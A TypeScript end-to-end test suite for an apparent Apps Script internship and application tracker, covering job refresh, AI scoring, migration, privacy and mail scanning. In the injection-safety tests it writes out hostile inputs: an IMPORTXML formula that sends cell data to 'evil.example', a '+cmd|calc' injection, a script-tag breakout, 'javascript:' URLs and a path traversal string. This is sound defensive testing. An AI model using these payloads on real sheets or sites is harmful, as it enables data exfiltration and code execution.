/**
 * End-to-end tests of the BUILT server bundle (dist/Code.js equivalent),
 * running against in-memory Apps Script fakes and fixture network responses.
 */
import vm from 'node:vm';
import { beforeAll, describe, expect, it } from 'vitest';
import { buildServer } from '../scripts/build.mjs';
import { createGasGlobals } from '../tools/gas-fakes.mjs';
import { fixtureFetch } from '../tools/fixtures.mjs';

type Rpc = { ok: boolean; data?: any; error?: { code: string; message: string } };
type Fetch = (req: { url: string; method: string; headers: Record<string, string>; payload?: string }) => { status: number; text: string };

let code = '';
beforeAll(async () => {
  // Deterministic: mail compiled in, no private seed data.
  code = (await buildServer({ config: { features: { mail: true }, personal: null } })).code;
}, 60_000);

export function boot(opts: { fetchImpl?: Fetch; html?: string; inbox?: () => unknown[]; code?: string } = {}) {
  const created = createGasGlobals({
    fetchImpl: (opts.fetchImpl ?? fixtureFetch) as never,
    htmlFiles: { index: opts.html ?? '<script type="text/plain" id="iip-boot">__IIP_BOOT_B64__</script>' },
    inbox: opts.inbox,
  } as never);
  const globals = created.globals;
  const state = created.state as any;
  const ctx = vm.createContext({ ...globals, console: { log() {}, warn() {}, error() {} } });
  vm.runInContext(opts.code ?? code, ctx);
  const call = (name: string, ...args: unknown[]): Rpc => JSON.parse(JSON.stringify((ctx as any)[name](...args)));
  const ok = (name: string, ...args: unknown[]) => {
    const r = call(name, ...args);
    if (!r.ok) throw new Error(`${name} failed: ${r.error?.code} ${r.error?.message}`);
    return r.data;
  };
  const ss = () => state.spreadsheets[state.spreadsheets.length - 1];
  return { ctx: ctx as any, state, call, ok, ss };
}

/** Decodes the base64url boot payload doGet embeds in the page. */
function bootData(html: string): any {
  const raw = /id="iip-boot">([^<]*)<\/script>/.exec(html)![1]!;
  return JSON.parse(Buffer.from(raw, 'base64url').toString('utf8'));
}

const PROFILE = {
  name: 'Asha',
  degree: 'bachelors',
  gradYear: 2027,
  skills: ['Python', 'PyTorch', 'SQL'],
  targetRoles: ['Machine Learning', 'Data Science', 'Software Engineering'],
  locations: ['India', 'Remote'],
  workModes: ['remote'],
  needsSponsorship: false,
  resumeText: 'Built ML models in Python and PyTorch.',
  links: { github: '', linkedin: '', portfolio: '' },
};

describe('first run', () => {
  it('creates a private spreadsheet with the v2 schema', () => {
    const s = boot();
    const data = s.ok('bootstrap');
    expect(data.jobs).toEqual([]);
    expect(data.settings.onboarded).toBe(false);
    expect(data.settings.secrets).toEqual({ gemini: false, openai_compat: false });
    expect(s.ss().getSheets().map((x: any) => x.getName())).toEqual(['Jobs', 'JobText', 'CoverLetters', 'Activity', 'Studies', 'Exams', 'Tasks', 'Mail']);
    expect(s.state.props.SPREADSHEET_ID).toBe(s.ss().getId());
  });

  it('sends the page immediately on a first visit and leaves setup to the client', () => {
    const s = boot();
    const out = s.ctx.doGet();
    expect(bootData(out.getContent())).toEqual({ data: null, error: '' });
    expect(s.state.spreadsheets).toHaveLength(0);
    s.ok('bootstrap');
    const again = bootData(s.ctx.doGet().getContent());
    expect(again.data.programs.length).toBeGreaterThan(100);
  });

  it('serves the boot payload as inert base64url text with safe framing', () => {
    const s = boot();
    s.ok('bootstrap');
    const name = '</script><script>alert(1)</script> // Dhruv · ✓ https://x.y';
    s.ok('saveProfile', { ...PROFILE, name });
    const out = s.ctx.doGet();
    const html = out.getContent();
    expect(html).not.toContain('</script><script>alert');
    expect(/id="iip-boot">([^<]*)<\/script>/.exec(html)![1]).toMatch(/^[A-Za-z0-9_=-]+$/);
    expect(out.xframe).toBe('DEFAULT');
    expect(bootData(html).data.profile.name).toBe(name);
  });
});

describe('refresh pipeline', () => {
  it('fetches, filters, scores and de-duplicates', () => {
    const s = boot();
    s.ok('saveProfile', PROFILE);
    s.ok('saveSettings', { sources: { boards: [{ ats: 'greenhouse', token: 'northwind' }, { ats: 'lever', token: 'missingco' }] } });
    const first = s.ok('refreshNow');
    expect(first.report.added).toBeGreaterThan(20);
    expect(first.report.sources.find((x: any) => x.id === 'lever:missingco').error).toMatch(/404/);
    expect(first.report.sources.find((x: any) => x.id === 'greenhouse:northwind').added).toBeGreaterThan(0);
    const jobs = first.jobs as any[];
    expect(jobs.every((j) => j.match && j.match.method === 'local' && j.score >= 0)).toBe(true);
    expect(jobs.some((j) => /Senior Staff/.test(j.role))).toBe(false);
    expect(jobs.some((j) => /Account Executive/.test(j.role))).toBe(false);
    const again = s.ok('refreshNow');
    expect(again.report.added).toBe(0);
    expect(again.report.duplicates).toBeGreaterThan(20);
    expect(again.jobs.length).toBe(jobs.length);
  });

  it('caps new postings per refresh and interleaves sources', () => {
    const s = boot();
    s.ok('saveProfile', PROFILE);
    s.ok('saveSettings', { filters: { maxNewPerRefresh: 10 }, sources: { boards: [{ ats: 'greenhouse', token: 'northwind' }] } });
    const r = s.ok('refreshNow');
    expect(r.report.added).toBe(10);
    expect(r.jobs.some((j: any) => j.source === 'greenhouse')).toBe(true);
  });
});

describe('jobs CRUD and safety', () => {
  it('stores scraped text as text, never as a formula', () => {
    const s = boot();
    s.ok('bootstrap');
    const evil = '=IMPORTXML("https://evil.example/?d="&A1,"//a")';
    const { job } = s.ok('createJob', { company: evil, role: '+cmd|calc', notes: '@SUM(1)' });
    const sheet = s.ss().getSheetByName('Jobs');
    const values = sheet.getDataRange().getValues().flat();
    expect(values.some((v: unknown) => String(v).startsWith('#FORMULA'))).toBe(false);
    expect(values).toContain(evil);
    const listed = s.ok('listJobs').jobs.find((j: any) => j.id === job.id);
    expect(listed.company).toBe(evil);
    expect(listed.notes).toBe('@SUM(1)');
  });

  it('keeps date-like, percent-like and boolean-like text exactly as typed', () => {
    const s = boot();
    const { job } = s.ok('createJob', { company: 'TRUE', role: 'Jan 1', location: '50%', notes: '0042' });
    const listed = s.ok('listJobs').jobs.find((j: any) => j.id === job.id);
    expect([listed.company, listed.role, listed.location, listed.notes]).toEqual(['TRUE', 'Jan 1', '50%', '0042']);
  });

  it('never queues AI work when no key is configured', () => {
    const s = boot();
    s.ok('saveProfile', PROFILE);
    s.ok('saveSettings', { ai: { provider: 'gemini', autoMinScore: 0 } });
    const jobs = s.ok('refreshNow').jobs as any[];
    expect(jobs.some((j) => j.aiStatus === 'queued')).toBe(false);
  });

  it('rejects duplicates, bad input and unknown fields', () => {
    const s = boot();
    s.ok('createJob', { company: 'Acme', role: 'ML Intern', url: 'https://acme.example/1' });
    expect(s.call('createJob', { company: 'ACME', role: 'ML Internship' }).error?.code).toBe('CONFLICT');
    expect(s.call('createJob', { company: '', role: 'x' }).error?.code).toBe('BAD_INPUT');
    expect(s.call('createJob', { company: 'A', role: 'B', url: 'javascript:alert(1)' }).error?.code).toBe('BAD_INPUT');
    const id = s.ok('listJobs').jobs[0].id;
    expect(s.call('updateJob', id, { score: 100 }).error?.code).toBe('BAD_INPUT');
    expect(s.call('updateJob', id, { stage: 'hired' }).error?.code).toBe('BAD_INPUT');
    expect(s.call('getJob', '../../etc').error?.code).toBe('BAD_INPUT');
    expect(s.call('getJob', 'j_000000000000').error?.code).toBe('NOT_FOUND');
  });

  it('tracks stage changes, dates and notes', () => {
    const s = boot();
    const { job } = s.ok('createJob', { company: 'Acme', role: 'Data Intern', description: 'SQL and Python' });
    const applied = s.ok('updateJob', job.id, { stage: 'applied', deadline: '2026-12-01', followUpAt: '2026-12-08', notes: 'Referral' }).job;
    expect(applied.stage).toBe('applied');
    expect(applied.appliedAt).not.toBe('');
    expect(applied.deadline).toBe('2026-12-01');
    expect(s.call('updateJob', job.id, { deadline: 'next friday' }).error?.code).toBe('BAD_INPUT');
    const detail = s.ok('getJob', job.id);
    expect(detail.job.description).toBe('SQL and Python');
    expect(detail.activity.some((a: any) => a.type === 'stage')).toBe(true);
  });

  it('bulk-updates and deletes, including emptying the table', () => {
    const s = boot();
    s.ok('saveProfile', PROFILE);
    const jobs = s.ok('refreshNow').jobs as any[];
    const ids = jobs.slice(0, 15).map((j) => j.id);
    const bulk = s.ok('bulkUpdate', ids, { stage: 'archived' });
    expect(bulk.jobs.every((j: any) => j.stage === 'archived')).toBe(true);
    expect(s.ok('deleteJobs', ids).deleted).toHaveLength(15);
    expect(s.ok('listJobs').jobs).toHaveLength(jobs.length - 15);
    const rest = s.ok('listJobs').jobs.map((j: any) => j.id);
    expect(s.ok('deleteJobs', rest).deleted).toHaveLength(rest.length);
    expect(s.ok('listJobs').jobs).toHaveLength(0);
    expect(s.ok('createJob', { company: 'After', role: 'Intern' }).job.company).toBe('After');
  });

  it('re-scores everything when the profile changes', () => {
    const s = boot();
    s.ok('createJob', { company: 'Acme', role: 'Rust Systems Intern', description: 'Rust, Linux, distributed systems' });
    const before = s.ok('listJobs').jobs[0].score;
    const after = s.ok('saveProfile', { ...PROFILE, skills: ['Rust', 'Linux', 'Distributed Systems'], targetRoles: ['Systems'] }).jobs[0].score;
    expect(after).toBeGreaterThan(before);
  });
});

describe('AI', () => {
  it('verifies keys before saving them, never exposes them', () => {
    const s = boot();
    expect(s.call('setSecret', 'gemini', 'AIzaBAD-key-for-tests-000000').error?.code).toBe('AI_NOT_CONFIGURED');
    expect(s.state.props['iip.secret.gemini']).toBeUndefined();
    const out = s.ok('setSecret', 'gemini', 'AIzaGOOD-key-for-tests-00000000');
    expect(out.settings.ai.provider).toBe('gemini');
    expect(out.settings.ai.model).toBe('gemini-flash-latest');
    expect(JSON.stringify(s.ok('bootstrap'))).not.toContain('AIzaGOOD');
  });

  it('analyses in batches, sends the key in a header, and respects the daily limit', () => {
    const seen: string[] = [];
    const s = boot({
      fetchImpl: (req) => {
        if (/generativelanguage/.test(req.url)) {
          seen.push(req.url);
          expect(req.url).not.toContain('key=');
          expect(req.headers['x-goog-api-key']).toBe('AIzaGOOD-key-for-tests-00000000');
        }
        return fixtureFetch(req);
      },
    });
    s.ok('saveProfile', PROFILE);
    s.ok('setSecret', 'gemini', 'AIzaGOOD-key-for-tests-00000000');
    s.ok('saveSettings', { ai: { autoAnalyze: false, dailyLimit: 2, batchSize: 5 } });
    const jobs = s.ok('refreshNow').jobs as any[];
    const ids = jobs.slice(0, 5).map((j) => j.id);
    const out = s.ok('analyzeWithAi', ids);
    expect(out.jobs.filter((j: any) => j.aiStatus === 'done')).toHaveLength(5);
    expect(out.jobs[0].match.method).toBe('ai');
    expect(out.usage.aiRequests).toBe(1);
    expect(seen.filter((u) => /generateContent/.test(u))).toHaveLength(1);
    s.ok('analyzeWithAi', jobs.slice(5, 6).map((j) => j.id));
    expect(s.call('analyzeWithAi', jobs.slice(6, 7).map((j) => j.id)).error?.code).toBe('AI_QUOTA');
  });

  it('backs off on provider quota errors without losing the job', () => {
    const s = boot({
      fetchImpl: (req) =>
        /:generateContent/.test(req.url)
          ? { status: 429, text: JSON.stringify({ error: { message: 'quota', details: [{ violations: [{ quotaId: 'GenerateRequestsPerDayPerProjectPerModel-FreeTier' }] }] } }) }
          : fixtureFetch(req),
    });
    s.ok('setSecret', 'gemini', 'AIzaGOOD-key-for-tests-00000000');
    const { job } = s.ok('createJob', { company: 'Acme', role: 'ML Intern', description: 'Python' });
    const r = s.ok('analyzeWithAi', [job.id]);
    expect(r.error).toMatch(/daily free quota/);
    expect(r.usage.cooldownUntil).not.toBe('');
    expect(s.call('analyzeWithAi', [job.id]).error?.code).toBe('AI_QUOTA');
    expect(s.ok('listJobs').jobs[0].match.method).toBe('local');
  });

  it('auto-queues promising postings during refresh', () => {
    const s = boot();
    s.ok('saveProfile', PROFILE);
    s.ok('setSecret', 'gemini', 'AIzaGOOD-key-for-tests-00000000');
    s.ok('saveSettings', { ai: { autoMinScore: 40, dailyLimit: 3 } });
    const r = s.ok('refreshNow');
    expect(r.report.aiAnalyzed).toBeGreaterThan(0);
    expect(r.report.aiAnalyzed).toBeLessThanOrEqual(15);
    expect(r.usage.aiRequests).toBeLessThanOrEqual(3);
  });

  it('writes cover letters with AI or an honest template without it', () => {
    const s = boot();
    s.ok('saveProfile', PROFILE);
    const { job } = s.ok('createJob', { company: 'Acme', role: 'ML Intern' });
    const local = s.ok('generateCoverLetter', job.id, { tone: 'professional', length: 'short' });
    expect(local.method).toBe('local');
    expect(local.text).toContain('Dear Acme hiring team');
    s.ok('setSecret', 'gemini', 'AIzaGOOD-key-for-tests-00000000');
    const ai = s.ok('generateCoverLetter', job.id, { tone: 'concise', length: 'short' });
    expect(ai.method).toBe('ai');
    expect(s.ok('getJob', job.id).coverLetter).toBe(ai.text);
  });
});

describe('automation', () => {
  it('installs one hourly trigger, refreshes once a day and emails a digest', () => {
    const s = boot();
    s.ok('saveProfile', PROFILE);
    s.ok('saveSettings', { automation: { enabled: true, hour: 0, digestThreshold: 50, timezone: 'UTC' } });
    expect(s.state.triggers.filter((t: any) => t.handler === 'worker')).toHaveLength(1);
    s.ok('saveSettings', { automation: { hour: 0 } });
    expect(s.state.triggers).toHaveLength(1);
    s.ctx.worker();
    expect(s.ok('listJobs').jobs.length).toBeGreaterThan(0);
    expect(s.state.mail).toHaveLength(1);
    expect(s.state.mail[0].to).toBe('student@example.com');
    const fetches = s.state.fetches.length;
    s.ctx.worker();
    expect(s.state.fetches.length).toBe(fetches);
    expect(s.state.mail).toHaveLength(1);
    s.ok('saveSettings', { automation: { enabled: false } });
    expect(s.state.triggers).toHaveLength(0);
  });

  it('retires the v1 daily trigger', () => {
    const s = boot();
    s.state.triggers.push({ handler: 'aggregateJobsDailyFlow', id: 'old' });
    s.ctx.aggregateJobsDailyFlow();
    expect(s.state.triggers).toHaveLength(0);
  });
});

describe('upgrade from v1', () => {
  it('converts v1 sheets in place, keeps backups, moves the key', () => {
    const s = boot();
    const ss = s.ctx.SpreadsheetApp.create('Internship Intelligence Platform Database');
    const jobs = ss.insertSheet('Internships');
    jobs.appendRow(['ID', 'Company', 'Role', 'Location', 'Source', 'URL', 'Description', 'Requirements', 'DateAdded', 'Deadline', 'AIMatchScore', 'AIRationale', 'Status', 'AppliedDate', 'ResumeVersion', 'Notes']);
    jobs.appendRow(['JOB_1', 'Lumen', 'ML Intern', 'Remote', 'SimplifyJobs', 'https://lumen.example/1', 'PyTorch', '', '', 'Dec 1', 78, '• Strong fit', 'Interviewing', '', '', 'Met at fair']);
    jobs.appendRow(['JOB_2', 'Kestrel', 'Data Intern', 'Pune', 'Excel Import', '', '', '', '', '', 0, 'AI model skipped', 'Offered', '', '', '']);
    const apps = ss.insertSheet('Applications');
    apps.appendRow(['InternshipID', 'SOPText', 'ResumeDriveLink', 'FollowUpDate']);
    apps.appendRow(['JOB_1', 'Dear Lumen…', '', '']);
    const prof = ss.insertSheet('UserProfile');
    prof.appendRow(['Key', 'Value']);
    prof.appendRow(['skills', 'Python, PyTorch']);
    prof.appendRow(['target_roles', 'Machine Learning']);
    s.state.props.SPREADSHEET_ID = ss.getId();
    s.state.props.GEMINI_API_KEY = 'AIzaOLD-v1-key-000000000000000';

    const data = s.ok('bootstrap');
    expect(data.migratedFromV1).toBe(2);
    const byRole = Object.fromEntries(data.jobs.map((j: any) => [j.role, j]));
    expect(byRole['ML Intern'].stage).toBe('interviewing');
    expect(byRole['ML Intern'].notes).toContain('v1 AI score 78/100');
    expect(byRole['Data Intern'].stage).toBe('offer');
    expect(data.profile.skills).toEqual(['Python', 'PyTorch']);
    expect(data.settings.secrets.gemini).toBe(true);
    expect(s.state.props.GEMINI_API_KEY).toBeUndefined();
    expect(ss.getSheetByName('v1 backup · Internships')).not.toBeNull();
    expect(s.ok('getJob', byRole['ML Intern'].id).coverLetter).toBe('Dear Lumen…');
    expect(s.ok('bootstrap').migratedFromV1).toBe(2);
    expect(s.ok('listJobs').jobs).toHaveLength(2);
  });
});

describe('limits and privacy', () => {
  it('rate-limits expensive calls per user', () => {
    const s = boot();
    for (let i = 0; i < 3; i++) s.ok('refreshNow');
    expect(s.call('refreshNow').error?.code).toBe('RATE_LIMITED');
  });

  it('never leaks internals on unexpected errors', () => {
    const s = boot({ fetchImpl: () => ({ status: 200, text: 'x' }) });
    s.ctx.SpreadsheetApp.create = () => {
      throw new Error('secret stack detail at line 42');
    };
    const r = s.call('bootstrap');
    expect(r.ok).toBe(false);
    expect(r.error!.code).toBe('INTERNAL');
    expect(r.error!.message).not.toContain('secret stack');
  });

  it('deletes everything on request', () => {
    const s = boot();
    s.ok('saveProfile', PROFILE);
    s.ok('setSecret', 'gemini', 'AIzaGOOD-key-for-tests-00000000');
    s.ok('createJob', { company: 'A', role: 'B' });
    s.ok('saveSettings', { automation: { enabled: true } });
    expect(s.call('deleteAllData', 'yes').error?.code).toBe('BAD_INPUT');
    s.ok('deleteAllData', 'DELETE');
    expect(Object.keys(s.state.props)).toHaveLength(0);
    expect(s.state.triggers).toHaveLength(0);
  });
});


describe('studies, exams and tasks', () => {
  it('seeds the programme and exam catalogues once, then keeps user changes', () => {
    const s = boot();
    const data = s.ok('bootstrap');
    expect(data.programs.length).toBeGreaterThan(100);
    expect(data.exams.length).toBeGreaterThan(20);
    expect(data.features.mail).toBe(true);
    const mbz = data.programs.find((p: any) => /MBZUAI/.test(p.name) && /Natural Language/.test(p.name));
    expect(mbz).toMatchObject({ deadline: '2026-12-15', funding: 'full', confirmed: true, stage: 'shortlisted', fit: '' });
    const ese = data.exams.find((x: any) => x.key === 'upsc-ese-2027');
    expect(ese.stage).toBe('dropped');
    const p = s.ok('updateProgram', mbz.id, { stage: 'preparing', docs: { sop: 'doing', lor: 'done', bogus: 'x' }, myNotes: 'Email Prof. X' }).program;
    expect(p.docs).toEqual({ sop: 'doing', lor: 'done' });
    const again = s.ok('refreshCatalogs');
    expect(again.added).toBe(0);
    expect(again.programs.find((x: any) => x.id === mbz.id)).toMatchObject({ stage: 'preparing', myNotes: 'Email Prof. X' });
    expect(s.ok('bootstrap').programs.length).toBe(data.programs.length);
    const cse = data.exams.find((x: any) => x.key === 'upsc-cse-2027');
    expect(s.ok('updateExam', cse.id, { stage: 'applied', applicationNo: 'OTR123' }).exam.stage).toBe('applied');
    expect(s.call('updateExam', cse.id, { events: [] }).error?.code).toBe('BAD_INPUT');
    const own = s.ok('createExam', { name: 'State PSC', events: [{ label: 'Prelims', date: '2027-06-01' }] }).exam;
    expect(own.events).toEqual([{ label: 'Prelims', date: '2027-06-01', precision: 'day' }]);
  });

  it('manages tasks with dates and times', () => {
    const s = boot();
    const t = s.ok('createTask', { title: 'Book IELTS', due: '2026-11-21T10:00', area: 'studies' }).task;
    expect(t).toMatchObject({ due: '2026-11-21T10:00', allDay: false, area: 'studies', status: 'todo' });
    expect(s.ok('updateTask', t.id, { status: 'done' }).task.status).toBe('done');
    expect(s.call('createTask', { title: 'x', due: 'tomorrowish' }).error?.code).toBe('BAD_INPUT');
    expect(s.call('createTask', { title: 'x', link: 'javascript:alert(1)' }).error?.code).toBe('BAD_INPUT');
    s.ok('deleteTask', t.id);
    expect(s.ok('bootstrap').tasks).toHaveLength(0);
  });

  it('applies a private seed once (profile, roadmap, abroad internships, ratings)', async () => {
    const personal = {
      version: 1,
      profile: { name: 'Seed User', skills: ['Python'], targetRoles: ['Machine Learning'] },
      ratings: { 'msc-natural-language-processing-mbzuai': { fit: 'top', note: 'Best fit' }, 'cactus-internship-max-planck-institutes': { fit: 'top', note: 'Strong' } },
      programStages: { 'msc-natural-language-processing-mbzuai': 'preparing' },
      tasks: [{ title: 'Book IELTS', due: '2026-11-21', area: 'studies' }],
    };
    const personalCode = (await buildServer({ config: { features: { mail: false }, personal } })).code;
    const s = boot({ code: personalCode });
    const data = s.ok('bootstrap');
    expect(data.profile.name).toBe('Seed User');
    expect(data.tasks.map((t: any) => t.title)).toEqual(['Book IELTS']);
    expect(data.programs.find((p: any) => p.key === 'msc-natural-language-processing-mbzuai')).toMatchObject({ fit: 'top', note: 'Best fit', stage: 'preparing' });
    const abroad = data.jobs.filter((j: any) => j.sourceLabel === 'Research internships abroad');
    expect(abroad.length).toBeGreaterThan(10);
    expect(abroad.find((j: any) => /CaCT/.test(j.role)).notes).toContain('Strong');
    expect(data.features.mail).toBe(false);
    const again = s.ok('bootstrap');
    expect(again.tasks).toHaveLength(1);
    expect(again.jobs.length).toBe(data.jobs.length);
  }, 60_000);
});

describe('mail', () => {
  it('reads the inbox, tracks applications, adds tasks and filters noise', async () => {
    const { sampleInbox } = await import('../tools/fixtures.mjs');
    const inbox = sampleInbox();
    const s = boot({ inbox: () => inbox });
    s.ok('createJob', { company: 'Kestrel Maps', role: 'Software Engineer Intern', stage: 'applied' });
    const out = s.ok('scanMail');
    expect(out.report.added).toBe(inbox.length);
    const byCompany = Object.fromEntries(out.jobs.map((j: any) => [j.company, j]));
    expect(byCompany['Lumen Labs'].stage).toBe('interviewing');
    expect(byCompany['Kestrel Maps'].stage).toBe('interviewing');
    expect(byCompany['Northwind AI'].stage).toBe('saved');
    expect(byCompany['Sable Security']).toBeUndefined();
    const ignored = out.mail.filter((m: any) => m.status === 'ignored').map((m: any) => m.fromName);
    expect(ignored).toEqual(expect.arrayContaining(['LinkedIn Job Alerts', 'Internshala', 'Corizo']));
    const titles = out.tasks.map((t: any) => t.title);
    expect(titles.some((t: string) => /^Complete Lumen Labs assessment/.test(t))).toBe(true);
    expect(titles.some((t: string) => /^Interview: Kestrel Maps/.test(t))).toBe(true);
    expect(titles.some((t: string) => /^Register: Northwind AI/.test(t))).toBe(true);
    expect(out.tasks.find((t: any) => /Kestrel/.test(t.title)).allDay).toBe(false);
    expect(out.tasks.every((t: any) => t.link.startsWith('https://mail.google.com/mail/u/'))).toBe(true);
    const mbz = out.mail.find((m: any) => /MBZUAI/.test(m.subject));
    expect(mbz).toMatchObject({ area: 'studies', status: 'new' });

    const second = s.ok('scanMail');
    expect(second.report.added).toBe(0);
    expect(second.tasks.length).toBe(out.tasks.length);

    const upsc = out.mail.find((m: any) => /upsc/.test(m.from));
    expect(s.ok('mailAction', upsc.id, 'task').task.area).toBe('exams');
    const sable = out.mail.find((m: any) => /Sable/.test(m.fromName));
    const tracked = s.ok('mailAction', sable.id, 'apply-stage');
    expect(tracked.job.stage).toBe('rejected');
    expect(s.ok('mailAction', mbz.id, 'ignore').mail.status).toBe('ignored');
    expect(s.call('mailAction', 'not-an-id!', 'done').error?.code).toBe('BAD_INPUT');
  });

  it('runs from the hourly worker and puts due items in the digest', async () => {
    const { sampleInbox } = await import('../tools/fixtures.mjs');
    const inbox = sampleInbox();
    const s = boot({ inbox: () => inbox });
    s.ok('saveSettings', { automation: { enabled: true, hour: 0, timezone: 'UTC', digestThreshold: 99 } });
    expect(s.state.triggers).toHaveLength(1);
    s.ctx.worker();
    expect(s.ok('bootstrap').mail.length).toBe(inbox.length);
    expect(s.state.mail).toHaveLength(1);
    expect(s.state.mail[0].htmlBody).toContain('Due in the next 2 days');
  });
});
